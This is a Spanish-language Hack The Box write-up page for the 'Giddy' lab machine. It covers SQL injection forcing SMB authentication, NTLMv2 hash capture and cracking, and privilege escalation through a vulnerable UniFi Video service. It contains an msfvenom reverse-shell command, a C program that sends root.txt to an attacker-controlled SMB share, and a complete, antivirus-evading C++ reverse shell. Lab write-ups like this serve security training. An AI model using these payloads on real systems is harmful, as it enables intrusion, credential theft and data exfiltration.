@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Giddy HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/giddy/pasted-20260310164456.png" alt="Giddy HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Giddy</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>sqli</span>
+            <span>responder</span>
+            <span>NTLMv2</span>
+            <span>evadir_av</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación web vulnerable a SQLI</li>
+            <li><code>Explotación</code>: SQLI fuerza una conexión SMB hacia Responder para capturar hash NTLMv2</li>
+            <li><code>Movimiento lateral</code>: Crack del hash y acceso con credenciales válidas</li>
+            <li><code>Escalada de Privilegios</code>: Servicio UniFi Video vulnerable</li>
+          </ul>
+          <p>- [ ] <code>Ofuscar Paylaod</code></p>
+          <p>- [ ] <code>Enumerar Servicios desde Registros</code></p>
+          <p>- [ ] <code>Alternativa Payload .C</code></p>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260310171021.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Fuzzing</h3>
+            <pre><code>gobuster dir -u http://10.129.96.140/mvc -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 30 -x asp,aspx</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260310171124.png" alt="Giddy HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260310233201.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Forzar error SQL</h3>
+            <pre><code>URL' # Error SQL        (SQLI)</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260310233314.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Ejecutar desde SQLI el siguiente comando para autenticarnos sobre el servidor SMB</h3>
+            <pre><code># Payloads
+URL EXEC xp_dirtree '\\&lt;kali_ip&gt;\SMB\'
+URL; EXEC xp_dirtree '\\&lt;kali_ip&gt;\SMB\'
+URL'; EXEC xp_dirtree '\\&lt;kali_ip&gt;\SMB\'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311000806.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Listener SMB</h3>
+            <pre><code>responder -I tun0 -v</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311000827.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Crackear hash NTLMv2</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; stacy:xNnWo6272k7x</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311001109.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Acceso WINRM</h3>
+            <pre><code>evil-winrm -u stacy -p xNnWo6272k7x -i giddy</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311002450.png" alt="Giddy HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Servicio vulnerable UnifiVideo</h2>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311162524.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Servicios</h3>
+            <pre><code># Encontramos un posible servicio instalado el cual es vulnerable a escalada de privilegios</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311162645.png" alt="Giddy HTB" />
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311233653.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.69 LPORT=443 -f exe &gt; taskkill.exe
+# Subir payload: C:/ProgramData/unifi-video
+# Hay un AV dando por culo</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311164220.png" alt="Giddy HTB" />
+          <h3>Ofuscar Payload</h3>
+          <div class="code-card">
+            <h3>payload_flag.c</h3>
+            <pre><code>#include &lt;stdlib.h&gt;
+
+int main(){
+	system("type C:/Users/Administrator/Desktop/root.txt &gt; \\\\10.10.16.69\SMB\root.txt");
+}</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ofuscar AV Compilando Payload menos agresivo</h3>
+            <pre><code>x86_64-w64-mingw32-gcc payload_flag.c -o taskkill.exe
+# Subir payload: C:/ProgramData/unifi-video</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listener</h3>
+            <pre><code>impacket-smbserver SMB $(pwd) -smb2support</code></pre>
+          </div>
+          <h3>Enumerar Servicios</h3>
+          <div class="code-card">
+            <h3>Enumerar servicios desde registros</h3>
+            <pre><code>ls HKLM:\SYSTEM\CurrentControlSet\Services\
+# Service Name: UniFiVideoService</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260311233419.png" alt="Giddy HTB" />
+          <div class="code-card">
+            <h3>Reiniciar Servicio</h3>
+            <pre><code>cmd /c sc stop UniFiVideoService
+cmd /c sc start UniFiVideoService</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260312000130.png" alt="Giddy HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>sqli</span>
+            <span>responder</span>
+            <span>NTLMv2</span>
+            <span>evadir_av</span>
+            <span>antivirus_bypass</span>
+            <span>compilar_payload</span>
+            <span>servicios</span>
+            <span>include</span>
+            <span>pragma</span>
+            <span>define</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Notas</h2>
+          <p>[[Compilar Exploits C]]</p>
+        </section>
+        <section class="writeup-section">
+          <h2>Alternativa Payload</h2>
+          <div class="code-card">
+            <h3>payload_shell.cpp</h3>
+            <pre><code>#include &lt;winsock2.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;ws2tcpip.h&gt;
+
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DEFAULT_BUFLEN 1024
+
+void XTJRSHZ(char* XGFXEG, int XERGTJ) {
+    while (true) {
+        Sleep(5000);
+
+        SOCKET REXQGW;
+        sockaddr_in addr;
+        WSADATA version;
+
+        WSAStartup(MAKEWORD(2, 2), &amp;version);
+
+        REXQGW = WSASocket(
+            AF_INET,
+            SOCK_STREAM,
+            IPPROTO_TCP,
+            NULL,
+            (unsigned int)NULL,
+            (unsigned int)NULL
+        );
+
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = inet_addr(XGFXEG);
+        addr.sin_port = htons(XERGTJ);
+
+        if (WSAConnect(REXQGW, (SOCKADDR*)&amp;addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+            closesocket(REXQGW);
+            WSACleanup();
+            continue;
+        } 
+        else {
+            char RecvData[DEFAULT_BUFLEN];
+            memset(RecvData, 0, sizeof(RecvData));
+
+            int RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0);
+
+            if (RecvCode &lt;= 0) {
+                closesocket(REXQGW);
+                WSACleanup();
+                continue;
+            } 
+            else {
+                char Process[] = "cmd.exe";
+
+                STARTUPINFO sinfo;
+                PROCESS_INFORMATION pinfo;
+
+                memset(&amp;sinfo, 0, sizeof(sinfo));
+                sinfo.cb = sizeof(sinfo);
+                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                sinfo.hStdInput  = (HANDLE)REXQGW;
+                sinfo.hStdOutput = (HANDLE)REXQGW;
+                sinfo.hStdError  = (HANDLE)REXQGW;
+
+                CreateProcess(
+                    NULL,
+                    Process,
+                    NULL,
+                    NULL,
+                    TRUE,
+                    0,
+                    NULL,
+                    NULL,
+                    &amp;sinfo,
+                    &amp;pinfo
+                );
+
+                WaitForSingleObject(pinfo.hProcess, INFINITE);
+
+                CloseHandle(pinfo.hProcess);
+                CloseHandle(pinfo.hThread);
+
+                memset(RecvData, 0, sizeof(RecvData));
+
+                int RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0);
+
+                if (RecvCode &lt;= 0) {
+                    closesocket(REXQGW);
+                    WSACleanup();
+                    continue;
+                }
+
+                if (strcmp(RecvData, "exit\n") == 0) {
+                    exit(0);
+                }
+            }
+        }
+    }
+}
+
+int main(int argc, char **argv) {
+
+    FreeConsole();
+
+    if (argc == 3) {
+        int port = atoi(argv[2]);
+        XTJRSHZ(argv[1], port);
+    } 
+    else {
+        char host[] = "10.10.16.69";
+        int port = 443;
+        XTJRSHZ(host, port);
+    }
+
+    return 0;
+}</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Compilar shell.cpp</h3>
+            <pre><code>i686-w64-mingw32-gcc shell.cpp -o taskkill -lws2_32</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listener</h3>
+            <pre><code>penelope -p 443</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Reiniciar servicio</h3>
+            <pre><code>cmd /c sc.exe stop UniFiVideoService
+cmd /c sc.exe start UniFiVideoService</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/giddy/pasted-20260312001546.png" alt="Giddy HTB" />
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
